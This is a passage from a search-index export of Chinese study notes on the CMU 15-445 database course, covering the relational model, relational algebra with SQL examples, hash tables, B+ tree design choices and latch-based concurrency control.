\u7b49\u5b9e\u9645\u4e0a\u5c5e\u4e8e\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf(Database Management Systems, DBMS)\uff0c\u662f\u7528\u6765\u7ba1\u7406\u6570\u636e\u5e93\u7684\u8f6f\u4ef6\u3002</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u97f3\u4e50\u8f6f\u4ef6\uff0c\u5982\u679c\u6211\u4eec\u9700\u8981\u4e3a\u5176\u8bbe\u8ba1\u6570\u636e\u5e93\uff0c\u53ef\u4ee5\u60f3\u5230\u628a artist \u548c album \u653e\u5728\u4e24\u4e2a\u4e0d\u540c\u7684 csv \u6587\u4ef6\u4e2d\uff0c\u5f53\u6211\u4eec\u6267\u884c\u67e5\u8be2\u7b49\u64cd\u4f5c\u65f6\u53ef\u4ee5\u8fdb\u884c\u9010\u884c\u89e3\u6790\uff1a</p> <pre><code>-- artist.csv\n--- Artist, Year, Country\n\"Wu-Tang Clan\", 1992, \"USA\"\n\"Notorious BIG\", 1992, \"USA\"\n\"GZA\", 1990, \"USA\"\n\n-- album.csv\n--- Album, Artist, Year\n\"Enter the Wu-Tang\", \"Wu-Tang Clan\", 1993\n\"St.Ides Mix Tape\", \"Wu-Tang Clan\", 1994\n\"Liquid Swords\", \"GZA\", 1990\n</code></pre> <p>\u4f8b\u5982\uff0c\u5f53\u6211\u4eec\u60f3\u8981\u67e5\u8be2\u4ec0\u4e48\u5e74\u4ee3 GZA \u51fa\u9053\uff0c\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u7b80\u5355\u7684 python \u4ee3\u7801\uff1a</p> <pre><code>for line in file.readlines():\n    record = parse(line)\n    if record[0] == \"GZA\":\n        print(int(record[1])\n\n# Actually in sql:\nSELECT year FROM artists WHERE name==\"GZA\";\n</code></pre> <p>\u4f17\u6240\u5468\u77e5\uff0c\u8fd9\u79cd\u7b80\u5355\u7684\u7ebf\u6027\u626b\u63cf\u5e76\u4e0d\u80fd\u5e26\u6765\u5b8c\u6574\u7684\u529f\u80fd\u548c\u6027\u80fd</p> <ul> <li>data intergrity</li> <li>implementation</li> <li>durability</li> <li>...</li> </ul>"},{"location":"Accumulation/CMU15-445/Course%20Overview/#data-models","title":"Data Models","text":"<ul> <li>Relational</li> <li>Key/Value</li> <li>Graph</li> <li>Document/Object</li> <li>Wide-Column/Column-family</li> <li>Array/Matrix/Vectors</li> <li>Hierarchical</li> <li>Network</li> <li>Multi-Value</li> </ul> <p>\u6700\u540e\u4e09\u79cd\u51e0\u4e4e\u6ca1\u6709\u4eba\u518d\u4f7f\u7528</p> <p>\u672c\u8bfe\u7a0b\u4e3b\u8981\u6d89\u53ca\u7684\u6570\u636e\u5e93\u5efa\u7acb\u5728\u5173\u7cfb\u578b\u6a21\u578b\u7684\u57fa\u7840\u4e0a\uff0c\u5b83\u6709\u5982\u4e0b\u4e09\u70b9\u5173\u952e\uff1a</p> <ul> <li>Store database in simple data structures (relations).</li> <li>Access data through high-level language, DBMS figures out best execution strategy.</li> <li>Physical storage left up to the DBMS implementation.</li> </ul> <p>\u56e0\u6b64\uff0c\u5bf9\u4e8e Ralational Model \u8bbe\u8ba1\u7684\u4e09\u4e2a\u91cd\u8981\u6982\u5ff5\u5728\u4e8e\uff1a</p> <ul> <li>&lt;1&gt; Structure: The defination of the dababase's relations and their contents</li> <li>&lt;2&gt; Intergrity: Ensure the database's contents satisfy constraints</li> <li>&lt;3&gt; Manipulation: Programming interface for accessing and modifying a database's contents</li> </ul> <p>\u7ee7\u7eed\u4f7f\u7528\u6211\u4eec\u4e0a\u4e00\u8282\u4e2d\u7684\u6570\u636e\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u5c06\u5176\u5b58\u50a8\u5728\u4e00\u4e2a Table\uff08Relation\uff09\u4e2d\uff1a</p> Name Year Country Wu-Tang Clan 1992 USA Notorious BIG 1992 USA GZA 1990 USA <p>\u5bf9\u4e8e\u4e00\u4e2a\u5173\u7cfb\uff0c\u6211\u4eec\u9700\u8981\u4e3a\u5176\u8bbe\u5b9a\u4e00\u4e2a Primary Key \u4f5c\u4e3a\u5404\u4e2a\u5143\u7ec4\u7684\u72ec\u7279\u6807\u8bc6\u3002\u5728\u672c\u4f8b\u4e2d\uff0c\u7531\u4e8e\u4e00\u822c\u60c5\u51b5\u4e0b Artist \u4e0d\u4f1a\u91cd\u540d\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 Name \u4f5c\u4e3a\u4e3b\u952e\u3002</p> <p>\u5982\u679c\u4e0d\u5b9a\u4e49\u4e3b\u952e\uff0c\u4e00\u4e9b DBMS \u4f1a\u81ea\u52a8\u751f\u6210\u4e00\u4e2a\u5185\u90e8\u4e3b\u952e</p> <p>\u4e0d\u8fc7\u6211\u4eec\u4e0d\u80fd\u4fdd\u8bc1 Artist \u7684\u540d\u5b57\u4e0d\u4f1a\u91cd\u590d\uff0c\u56e0\u6b64\uff0c\u66f4\u597d\u7684\u89e3\u51b3\u529e\u6cd5\u662f\uff0c\u989d\u5916\u8bbe\u7f6e\u4e00\u4e2a ID \u5b57\u6bb5\u6765\u4f5c\u4e3a\u4e3b\u952e\uff0c\u4f8b\u5982\uff1a</p> ID Name Year Country 123 Wu-Tang Clan 1992 USA 456 Notorious BIG 1992 USA 789 GZA 1990 USA <p>\u9664\u6b64\u4e4b\u5916\uff0c\u5bf9\u4e8e\u591a\u4e2a\u5173\u8054\u7684 Relation\uff0c\u6211\u4eec\u9700\u8981\u7ef4\u62a4\u4e00\u4e2a Foreign Key \u6765\u8fdb\u884c\u7c7b\u4f3c\"\u6620\u5c04\"\u7684\u64cd\u4f5c\u3002\u4e00\u4e2a\u6700\u5e38\u7528\u7684\u65b9\u6cd5\u662f\u521b\u5efa\u4e00\u4e2a\u4ea4\u53c9\u5f15\u7528\u8868\uff1a</p> <p></p>"},{"location":"Accumulation/CMU15-445/Course%20Overview/#data-manipulation-languages-dmls","title":"Data Manipulation Languages, DMLs","text":"<p>DMLs \u662f\u7528\u6765\u4ece\u6570\u636e\u5e93\u4e2d\u5b58\u53d6\u6570\u636e\u7684\u8bed\u8a00\uff0c\u5373\u4e0e\u6570\u636e\u5e93\u4ea4\u4e92\u7684\u65b9\u5f0f\u3002\u5b83\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b\uff1a</p> <ul> <li>Procedural Method: \u5bf9\u6570\u636e\u5e93\u7684\u8bf7\u6c42\u4e13\u6ce8\u4e8e\u66f4\u9ad8\u5c42\u6b21\u4e0a\u5bf9\u5982\u4f55\u67e5\u8be2\u60f3\u8981\u7ed3\u679c\u7684\u7b56\u7565<ul> <li>Relational Algebra</li> </ul> </li> <li>Non-Procedural (Declarative): \u5bf9\u6570\u636e\u5e93\u7684\u8bf7\u6c42\u53ea\u6307\u51fa\u6211\u4eec\u60f3\u8981\u7684\u6570\u636e\uff0c\u800c\u4e0d\u662f\u600e\u4e48\u53bb\u627e\u5230\u5b83<ul> <li>Relational Calculus</li> </ul> </li> </ul>"},{"location":"Accumulation/CMU15-445/Course%20Overview/#relational-algebra","title":"Relational Algebra","text":"<p>\u5bf9\u4e8e\u5173\u7cfb\u4ee3\u6570\uff0c\u6211\u4eec\u5b9a\u4e49\u4ee5\u4e0b\u4e03\u4e2a\u6700\u57fa\u672c\u7684\u5173\u7cfb\u7b26\u53f7\uff0c\u5b83\u4eec\u7684\u64cd\u4f5c\u6570\u662f\u5173\u7cfb\u4e2d\u7684\u5143\u7ec4\uff1a</p> Symbols Operations \\(\\sigma\\) Select \\(\\Pi\\) Projection \\(\\cup\\) Union \\(\\cap\\) Intersection - Difference \\(\\times\\) Product \\(\\bowtie\\) Join <p>\u63a5\u4e0b\u6765\u6211\u4eec\u4ee5 \\(R(a\\_id, b\\_id)\\) \u548c \\(S(a\\_id, b\\_id)\\) \u4e24\u4e2a\u5173\u7cfb\u6765\u6f14\u793a\u5404\u4e2a\u64cd\u4f5c\u7684\u6548\u679c\uff1a</p> <p></p> <p>1. Select</p> <p>\u8bed\u6cd5\u4e3a\uff1a</p> \\[ \\sigma_{predicate}(R) \\] <pre><code>SELECT * FROM R WHERE a_id='a2' AND b_id &gt; 102;\n</code></pre> \\[ \\sigma_{ a\\_id ='a2' \\land b\\_id \\gt 102}(R) \\] a_id b_id a2 103 <p>2. Projection</p> <p>\u8bed\u6cd5\uff1a</p> \\[ \\Pi _{A1, A2, ...,An}(R) \\] <pre><code>SELECT b_id-100, a_id FROM R WHERE b_id &gt; 101;\n</code></pre> \\[ \\Pi _{b \\_id -100, a\\_id} (\\sigma_{ b\\_id \\gt 101}(R)) \\] b_id-100 a_id 2 a_2 3 a_3 <p>3. Union</p> <p>\u8bed\u6cd5\uff1a</p> \\[ R\\cup S \\] <pre><code>(SELECT * FROM R)\n    UNION ALL\n(SELECT * FROM S);\n</code></pre> a_id b_id a1 101 a2 102 a3 103 a3 103 a4 104 a5 105 <p>4. Intersect</p> <p>\u8bed\u6cd5\uff1a</p> \\[ R\\cap S \\] <pre><code>(SELECT * FROM R)\n    INTERSECT\n(SELECT * FROM S);\n</code></pre> a_id b_id a3 103 <p>5. Difference</p> <p>\u8bed\u6cd5\uff1a</p> \\[ R-S \\] <pre><code>(SELECT * FROM R)\n    EXCEPT\n(SELECT * FROM S);\n</code></pre> a_id b_id a1 101 a2 102 <p>6. Product</p> <p>\u8bed\u6cd5\uff1a</p> \\[ R\\times S \\] <pre><code>SELECT * FROM S CROSS JOIN S;\n\nSELECT * FROM S, R;\n</code></pre> R.a_id R.b_id S.a_id S.b_id a1 101 a3 103 a1 101 a4 104 a1 101 a5 105 a2 102 a3 103 a2 102 a4 104 a2 102 a5 105 a3 103 a3 103 a3 103 a4 104 a3 103 a5 105 <p>7. Join</p> <p>\u8bed\u6cd5\uff1a</p> \\[ R\\bowtie S \\] <pre><code>SELECT * FROM R NATURAL JOIN S;\n\nSELECT * FROM R JOIN S USING (a_id, b_id);\n</code></pre> a_id b_id a3 103"},{"location":"Accumulation/CMU15-445/Data%20Structures/","title":"6. Data Structures","text":""},{"location":"Accumulation/CMU15-445/Data%20Structures/#6-data-structures","title":"6. Data Structures","text":"<p> \u7ea6 2042 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 10 \u5206\u949f</p> <p>Data Structures</p> <p>DBMS \u5bf9\u7cfb\u7edf\u5185\u90e8\u591a\u4e2a\u4e0d\u540c\u90e8\u5206\u4f7f\u7528\u4e0d\u540c\u7684\u6570\u636e\u7ed3\u6784\uff0c\u5305\u62ecInternal Meta-Data\uff0cCore Data Storage\uff0cTemporary Data Structures\uff0cTable Indices\u3002</p> <p>\u5728\u4e3a DBMS \u5b9e\u73b0\u6570\u636e\u7ed3\u6784\u65f6\uff0c\u9700\u8981\u8003\u8651\u7684\u4e24\u4e2a\u4e3b\u8981\u8bbe\u8ba1\u51b3\u7b56\uff1a</p> <ul> <li>Data Organization: \u5982\u4f55\u5e03\u5c40\u5185\u5b58\u4ee5\u53ca\u5728\u6570\u636e\u7ed3\u6784\u4e2d\u5b58\u50a8\u54ea\u4e9b\u4fe1\u606f</li> <li>Concurrency: \u5982\u4f55\u8ba9\u591a\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8bbf\u95ee\u6570\u636e\u7ed3\u6784</li> </ul>"},{"location":"Accumulation/CMU15-445/Data%20Structures/#hash-table","title":"Hash Table","text":"<p>\u54c8\u5e0c\u8868\u662f\u5b9e\u73b0\u5c06\u952e\u6620\u5c04\u5230\u503c\u7684\u5173\u8054\u6570\u7ec4\u62bd\u8c61\u6570\u636e\u7ed3\u6784\uff0c\u5b83\u63d0\u4f9b\u5e73\u5747 \\(O(1)\\) \u65f6\u95f4\u590d\u6742\u5ea6\uff08\u6700\u574f\u60c5\u51b5\u4e3a \\(O(N)\\)\uff09\u548c \\(O(N)\\) \u7a7a\u95f4\u590d\u6742\u5ea6\u3002</p> <p>\u5373\u4fbf\u662f \\(O(1)\\) \u590d\u6742\u5ea6\uff0c\u4e5f\u9700\u8981\u8003\u8651\u5e38\u6570\u56e0\u5b50\u4f18\u5316</p> <p>\u54c8\u5e0c\u8868\u7684\u5b9e\u73b0\u7531\u4e24\u90e8\u5206\u7ec4\u6210\uff1a</p> <ul> <li>Hash Function: \u54c8\u5e0c\u51fd\u6570\u7528\u6765\u8ba1\u7b97\u7d22\u5f15\uff0c\u5c06\u4e00\u4e2a\u8f83\u5927 Key Space \u6620\u5c04\u5230\u8f83\u5c0f Domain\u3002\u6211\u4eec\u9700\u8981\u8003\u8651\u5feb\u901f\u6267\u884c\u548c\u51b2\u7a81\u7387\u4e4b\u95f4\u7684\u5e73\u8861\u3002<ul> <li>DBMS \u4e0d\u9700\u8981\u8003\u8651\u4f7f\u7528\u52a0\u5bc6\u7684\u54c8\u5e0c\u51fd\u6570\uff08\u5982 SHA-256\uff09\uff0c\u56e0\u4e3a\u54c8\u5e0c\u51fd\u6570\u4ec5\u4f9b\u6570\u636e\u5e93\u5185\u90e8\u4f7f\u7528\uff0c\u4e0d\u4f1a\u6cc4\u9732\u5230\u5916\u9762\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ea\u8003\u8651\u54c8\u5e0c\u51fd\u6570\u7684\u901f\u5ea6\u548c\u51b2\u7a81\u7387\u3002</li> <li>\u5f53\u524d\u6700\u5148\u8fdb\u7684\u54c8\u5e0c\u51fd\u6570\u662f Facebook XXHash3</li> </ul> </li> <li>Hash Scheme: \u5982\u4f55\u5904\u7406\u54c8\u5e0c\u51b2\u7a81\u3002<ul> <li>\u5904\u7406\u51b2\u7a81\u7684\u65b9\u6848\u89c1\u4e0b\u6587</li> </ul> </li> </ul>"},{"location":"Accumulation/CMU15-445/Data%20Structures/#static-hashing-schemes","title":"Static Hashing Schemes","text":"<ul> <li>Linear Probe Hashing</li> <li>Robin Hood Hashing</li> <li>Cuckoo Hashing</li> </ul>"},{"location":"Accumulation/CMU15-445/Data%20Structures/#dynamic-hashing-schemes","title":"Dynamic Hashing Schemes","text":"<ul> <li>Chained Hashing</li> <li>Extendible Hashing</li> <li>Linear Hashing</li> </ul>"},{"location":"Accumulation/CMU15-445/Data%20Structures/#b-tree-index","title":"B+ Tree Index","text":"<p>B+ \u6811\u662f\u4e00\u79cd\u81ea\u5e73\u8861\u6811\u7ed3\u6784\uff0c\u5b83\u4fdd\u6301\u6570\u636e\u6392\u5e8f\u5e76\u5141\u8bb8\u5728 \\(O(\\log N)\\) \u65f6\u95f4\u5185\u8fdb\u884c\u641c\u7d22\u3001\u987a\u5e8f\u8bbf\u95ee\u3001\u5220\u9664\u548c\u63d2\u5165\u3002</p> <p>B+ \u6811\u7d22\u5f15\u4e00\u822c\u7528\u4e8e\u6570\u636e\u5e93\u7684 Table Indices \u90e8\u5206\uff0c\u51e0\u4e4e\u6240\u6709\u652f\u6301 Order-preserving indexes \u7684\u73b0\u4ee3 DBMS \u90fd\u4f7f\u7528\u4e86 B+ Tree\u3002</p> <p>B-Tree \u548c B+ Tree \u7684\u533a\u522b\u5728\u4e8e B+ \u6811\u5c06\u6240\u6709\u503c\u5b58\u50a8\u5728\u53f6\u8282\u70b9\u4e2d</p> <p>\u5185\u90e8\u8282\u70b9\u5b58\u50a8\u7740\u6307\u5411\u4e0b\u5c42\u8282\u70b9\u7684\u6307\u9488\uff1b\u800c\u5bf9\u4e8e\u53f6\u8282\u70b9\uff0c\u4e00\u79cd\u65b9\u6cd5\u662f\u5b58\u50a8 Record ID\uff0c\u5373 tuple location \u7684\u6307\u9488\uff0c\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u5b58\u50a8\u5143\u7ec4\u7684\u6570\u636e\u3002</p> <p>Non-Unique Indexes</p> <p>\u5bf9\u4e8e\u54c8\u5e0c\u8868\u548c B+ \u6811\uff0c\u5904\u7406\u975e\u552f\u4e00\u7d22\u5f15\u6709\u4e24\u79cd\u65b9\u5f0f\uff1a</p> <ul> <li>Duplicate Keys: \u91cd\u590d\u5b58\u50a8\u8be5\u503c</li> <li>Value Lists: \u7ef4\u62a4\u552f\u4e00\u503c\u7684\u94fe\u8868</li> </ul>"},{"location":"Accumulation/CMU15-445/Data%20Structures/#design-choices","title":"Design Choices","text":"<p>Node Size</p> <p>\u6839\u636e\u5b58\u50a8\u4ecb\u8d28\uff0c\u6211\u4eec\u9700\u8981\u9009\u62e9\u4e0d\u540c\u5927\u5c0f\u7684\u8282\u70b9\u3002\u4f8b\u5982\uff0c\u5b58\u50a8\u5728\u78c1\u76d8\u4e0a\u7684\u8282\u70b9\u5927\u5c0f\u901a\u5e38\u662f MB \u7ea7\uff0c\u4ee5\u4fbf\u5c3d\u53ef\u80fd\u51cf\u5c11\u641c\u7d22\u6b21\u6570\u3002\u800c\u5185\u5b58\u4e2d\u7684\u8282\u70b9\u53ef\u4ee5\u5c0f\u5230 512B \u5927\u5c0f\uff0c\u53ea\u8981\u80fd\u5c06 Page \u653e\u5165 CPU \u7f13\u5b58\u5373\u53ef\u3002</p> <p>Merge Threshold</p> <p>\u6309\u7167 B+ \u6811\u7684\u539f\u5219\uff0c\u5220\u9664\u952e\u503c\u540e\u8282\u70b9\u5982\u679c\u4e0d\u8db3\u534a\u6ee1\uff0c\u5219\u8981\u5408\u5e76\u4e0b\u6ea2\u8282\u70b9\u3002\u4f46\u662f\u6709\u65f6\u6682\u65f6\u8fdd\u53cd\u89c4\u5219\u4ee5\u51cf\u5c11\u5220\u9664\u64cd\u4f5c\u7684\u6570\u91cf\u53ef\u80fd\u6709\u66f4\u9ad8\u7684\u6536\u76ca\u3002</p> <p>Variable Length Keys</p> <p>\u4e00\u5c0f\u90e8\u5206\u5927 Keys \u53ef\u80fd\u4f1a\u5bfc\u81f4\u5927\u91cf\u7a7a\u95f4\u6d6a\u8d39\uff0c\u56e0\u6b64\u6211\u4eec\u8003\u8651\u4f7f\u7528\u53ef\u53d8\u957f\u5ea6\u952e\u503c\uff0c\u6709\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u505a\u5230\u8fd9\u70b9\uff1a</p> <ul> <li>&lt;1&gt; Pointer: \u53ea\u5b58\u50a8\u6307\u5411 Keys \u7684\u6307\u9488\u3002<ul> <li>\u7f3a\u70b9\u662f\u6548\u7387\u4f4e\u4e0b\uff0c\u53ea\u9002\u5408\u5d4c\u5165\u5f0f\u8bbe\u5907\u4f7f\u7528</li> </ul> </li> <li>&lt;2&gt; Variable Length Node: \u5141\u8bb8\u53ef\u53d8\u957f\u5ea6\u7684\u8282\u70b9<ul> <li>\u8fd9\u5b9e\u9645\u4e0a\u662f\u96be\u4ee5\u6267\u884c\u7684\uff0c\u5e76\u4e14\u5904\u7406\u957f\u5ea6\u53d8\u66f4\u4f1a\u5e26\u6765\u5de8\u5927\u7684\u5185\u5b58\u7ba1\u7406\u5f00\u9500</li> </ul> </li> <li>&lt;3&gt; Padding: \u5c06\u6bcf\u4e2a Key \u7684\u5927\u5c0f\u8bbe\u7f6e\u4e3a\u6700\u5927 Key \u5927\u5c0f\uff0c\u586b\u5145\u8f83\u5c0f\u7684\u952e<ul> <li>\u7f3a\u70b9\u662f\u5bf9\u5185\u5b58\u7684\u5de8\u5927\u6d6a\u8d39</li> </ul> </li> <li>&lt;4&gt; Key Map/Indirection: \u5c06 Key \u66ff\u6362\u4e3a\u6307\u5411\u952e\u503c\u5bf9\u5e8f\u5217\u7684\u7d22\u5f15<ul> <li>\u8fd9\u662f\u6700\u4e3b\u6d41\u7684\u65b9\u6cd5</li> </ul> </li> </ul> <p>Intra-Node Search</p> <p>\u4e00\u65e6\u6211\u4eec\u5230\u8fbe\u4e00\u4e2a\u8282\u70b9\uff0c\u4ecd\u9700\u8981\u5728\u8282\u70b9\u5185\u8fdb\u884c\u641c\u7d22\u3002</p> <ul> <li>&lt;1&gt; Linear<ul> <li>\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u7ebf\u6027\u626b\u63cf\u77e5\u9053\u627e\u5230\u6240\u9700\u7684 Key\u3002</li> <li>\u4f18\u70b9\u662f\uff0c\u4e0d\u9700\u8981\u5bf9\u952e\u8fdb\u884c\u6392\u5e8f\uff0c\u80fd\u591f\u66f4\u5feb\u5730\u6267\u884c\u5220\u9664\u3001\u63d2\u5165\uff1b\u7f3a\u70b9\u662f\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N)\\)\uff0c\u6548\u7387\u8f83\u4f4e\u3002</li> </ul> </li> <li>&lt;2&gt; Binary<ul> <li>\u4e8c\u53c9\u641c\u7d22\u6548\u7387\u8f83\u9ad8\uff0c\u4f46\u662f\u9700\u8981\u989d\u5916\u7ef4\u62a4\u8282\u70b9\u5185\u5927\u5c0f\u987a\u5e8f</li> </ul> </li> <li>&lt;3&gt; Interpolation<ul> <li>\u5728\u67d0\u4e9b\u7279\u5b9a\u6570\u636e\u5e93\u4e2d\uff0c\u6211\u4eec\u77e5\u9053\u8282\u70b9\u7684\u5927\u81f4\u5206\u5e03\u7ed3\u6784\uff0c\u6b64\u65f6\u53ef\u4ee5\u5229\u7528\u63d2\u503c\u6765\u627e\u5230\u6b63\u786e\u4f4d\u7f6e\u7684\u90bb\u8fd1\u57df</li> </ul> </li> </ul>"},{"location":"Accumulation/CMU15-445/Data%20Structures/#optimization","title":"Optimization","text":"<p>Pointer Swizzing</p> <p>\u770b\u4e0d\u61c2\uff08\uff09</p> <p>Bulk Insert</p> <p>\u521d\u59cb\u5316 B+ \u6811\u65f6\uff0c\u4e0d\u628a\u8282\u70b9\u4e00\u4e2a\u4e00\u4e2a\u63d2\u5165\uff0c\u800c\u662f\u5148\u6392\u5e8f\u597d\u518d\u81ea\u4e0b\u800c\u4e0a\u6784\u5efa\u3002</p> <p>Prefix Compression</p> <p>\u76f8\u4f3c\u7684 Keys \u5728 B+ \u6811\u5f88\u53ef\u80fd\u662f\u5f7c\u6b64\u76f8\u90bb\u7684\uff0c\u6b64\u65f6\u5b83\u4eec\u7684\u524d\u7f00\u4f1a\u6709\u6240\u91cd\u5408\u3002\u6b64\u65f6\u6211\u4eec\u53ea\u9700\u8981\u5728\u8282\u70b9\u7684\u5f00\u5934\u5b58\u50a8\u4e00\u6b21\u524d\u7f00\uff0cSlot \u5185\u5b58\u50a8\u4e0d\u540c\u7684\u90e8\u5206\u5373\u53ef\uff1a</p> <p></p> <p>Deduplication</p> <p>\u5bf9\u4e8e\u91cd\u590d\u952e\uff0c\u53ea\u5199\u5165\u4e00\u6b21\uff0c\u7136\u540e\u5728\u540e\u9762\u6dfb\u52a0\u5176\u5b83\u5173\u8054\u503c\u3002</p> <p>Suffix Truncation</p> <p>\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u5185\u90e8\u8282\u70b9\u4e2d\u7684 Key \u4ec5\u7528\u4f5c\u8def\u6807\u4f5c\u7528\uff0c\u6211\u4eec\u53ea\u8981\u641c\u7d22\u5230\u5e95\u5c42\u53f6\u8282\u70b9\u5373\u53ef\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u53ea\u9700\u8981 Internal Node \u4e2d\u7684\u952e\u503c\u7684\u6700\u5c0f\u524d\u7f00\uff0c\u5373\u540e\u7f00\u622a\u65ad\u3002</p>"},{"location":"Accumulation/CMU15-445/Data%20Structures/#index-concurrency-control","title":"Index Concurrency Control","text":"<p>\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u5047\u8bbe\u8ba8\u8bba\u7684 DBMS \u90fd\u662f\u5355\u7ebf\u7a0b\u7684\u3002\u4f46\u662f\u5927\u591a\u6570 DBMS \u9700\u8981\u5141\u8bb8\u591a\u7ebf\u7a0b\u540c\u65f6\u5b89\u5168\u5730\u8bbf\u95ee\u6570\u636e\u7ed3\u6784\u3002</p> <p>\u5e76\u53d1\u63a7\u5236\u534f\u8bae\uff08Concurrency Control Protocol\uff09\u662f DBMS \u7528\u6765\u786e\u4fdd\u5171\u4eab\u5bf9\u8c61\u4e0a\u7684\u5e76\u53d1\u64cd\u4f5c\u6b63\u786e\u6027\u7684\u65b9\u6cd5\uff1a</p> <ul> <li>Logical Correctness: \u7ebf\u7a0b\u80fd\u591f\u8bfb\u53d6\u5230\u5b83\u60f3\u8981\u7684\u503c</li> <li>Physical Correctness: \u5bf9\u8c61\u7684\u5185\u90e8\u8868\u793a\u662f\u5408\u7406\u7684<ul> <li>\u4f8b\u5982\uff0c\u6570\u636e\u7ed3\u6784\u4e2d\u6ca1\u6709\u4f1a\u5bfc\u81f4\u7ebf\u7a0b\u8bfb\u53d6\u65e0\u6548\u5185\u5b58\u533a\u57df\u7684\u6307\u9488</li> </ul> </li> </ul> <p>Locks vs Latches</p> <p></p> LocksLatches <p>Locks \u662f\u4e00\u79cd\u76f8\u5bf9\u9ad8\u7ea7\u7684\u903b\u8f91\u539f\u8bed\uff0c\u5b83\u4fdd\u62a4\u6570\u636e\u5e93\u7684\u5185\u5bb9\u514d\u53d7\u5176\u5b83\u4e8b\u52a1\u5e72\u6270\u3002\u6570\u636e\u5e93\u7cfb\u7edf\u53ef\u4ee5\u5411\u7528\u6237\u516c\u5f00\u5728\u8fd0\u884c\u67e5\u8be2\u65f6\u6301\u6709\u7684 Locks\uff0c\u5e76\u4e14 Locks \u9700\u8981\u80fd\u591f\u56de\u6eda\u66f4\u6539\u3002</p> <p>Latches \u662f\u4ece\u5176\u5b83\u7ebf\u7a0b\u4e2d\u5e95\u5c42\u5730\u4fdd\u62a4 DBMS \u5185\u90e8\u5173\u952e\u6570\u636e\u7ed3\u6784\u7684\u539f\u8bed\u3002Latches \u4ec5\u5728\u6267\u884c\u64cd\u4f5c\u65f6\u4fdd\u6301\uff0c\u4e14\u4e0d\u9700\u8981\u56de\u6eda\u66f4\u6539\u3002\u9501\u5b58\u5668\u6709\u4e24\u79cd\u6a21\u5f0f\uff1a</p> <ul> <li>READ: \u5141\u8bb8\u591a\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8bfb\u53d6\u540c\u4e00\u9879\u3002\u5373\u4fbf\u4e00\u4e2a\u7ebf\u7a0b\u5df2\u7ecf\u83b7\u53d6\u4e86 Read Latch\uff0c\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u4e5f\u53ef\u4ee5\u83b7\u5f97\u5b83</li> <li>WRITE: \u53ea\u5141\u8bb8\u4e00\u4e2a\u7ebf\u7a0b\u8bbf\u95ee\u8be5\u9879\u3002\u5982\u679c\u4e00\u4e2a\u7ebf\u7a0b\u5df2\u7ecf\u83b7\u53d6\u4e86 Write Latch\uff0c\u90a3\u4e48\u5176\u5b83\u7ebf\u7a0b\u4e0d\u518d\u80fd\u591f\u83b7\u5f97\u5b83\u3002\u6301\u6709 Write Latch \u7684\u7ebf\u7a0b\u8fd8\u4f1a\u963b\u6b62\u5176\u5b83\u7ebf\u7a0b\u83b7\u5f97 Read Latch\u3002</li> </ul>"},{"location":"Accumulation/CMU15-445/Data%20Structures/#latch-implementations","title":"Latch Implementations","text":"<p>\u7528\u4e8e\u5b9e\u73b0 Latch \u7684\u5e95\u5c42\u539f\u8bed\u662f\u901a\u8fc7\u73b0\u4ee3 CPU \u63d0\u4f9b\u7684 atomic compare-and-swap (CAS) \u6307\u4ee4\u3002\u901a\u8fc7 CAS\uff0c\u7ebf\u7a0b\u53ef\u4ee5\u68c0\u67e5\u5185\u5b58\u67d0\u4f4d\u7f6e\u7684\u5185\u5bb9\uff0c\u4ee5\u67e5\u770b\u662f\u5426\u542b\u6709\u60f3\u8981\u7684\u503c\uff0c\u5982\u679c\u5b58\u5728\uff0c\u5219\u5c06\u65e7\u503c\u66ff\u6362\u4e3a\u65b0\u503c\uff1b\u5426\u5219\uff0c\u4fdd\u6301\u4e0d\u53d8\u3002</p> <p>DBMS \u4e2d\u5b9e\u73b0 Latch \u6709\u591a\u79cd\u65b9\u6cd5\uff0c\u6bcf\u79cd\u65b9\u6cd5\u5728\u5de5\u7a0b\u590d\u6742\u6027\u548c\u8fd0\u884c\u65f6\u6027\u80fd\u65b9\u9762\u6709\u6240\u6743\u8861\u3002</p> <p>Blocking OS Mutex</p> <p>Latch \u7684\u4e00\u79cd\u5b9e\u73b0\u65b9\u5f0f\u662f\u901a\u8fc7 OS \u5185\u7f6e\u7684 Mutex\u3002Linux \u7cfb\u7edf\u63d0\u4f9b\u4e86 Futex(Fast User-space Mutex)\uff0c\u5b83\u7531\u7528\u6237\u7a7a\u95f4\u7684 spin latch \u548c\u64cd\u4f5c\u7cfb\u7edf\u7ea7\u522b\u7684 Mutex \u7ec4\u6210\u3002</p> <p>\u5982\u679c DBMS \u53ef\u4ee5\u83b7\u53d6\u7528\u6237\u7a7a\u95f4\u9501\u5b58\u5668\uff0c\u5219\u8bbe\u7f6e\u5b83\u3002\u5982\u679c DBMS \u4e0d\u80fd\u83b7\u53d6\u7528\u6237\u7a7a\u95f4\u9501\u5b58\u5668\uff0c\u5b83\u4f1a\u8fdb\u5165\u5185\u6838\u5c1d\u8bd5\u83b7\u53d6\u5f00\u9500\u66f4\u5927\u7684 Mutex\u3002\u5982\u679c\u4e0a\u8ff0\u4e24\u4e2a\u64cd\u4f5c\u5747\u5931\u8d25\uff0c\u7ebf\u7a0b\u5c06\u4f1a\u901a\u77e5 OS \u5e76\u53d6\u6d88\u8c03\u5ea6\u3002</p> <p>\u5728 DBMS \u4e2d\uff0cOS Mutex \u901a\u5e38\u662f\u4e2a\u574f\u4e3b\u610f\uff0c\u56e0\u4e3a\u5b83\u7531 OS 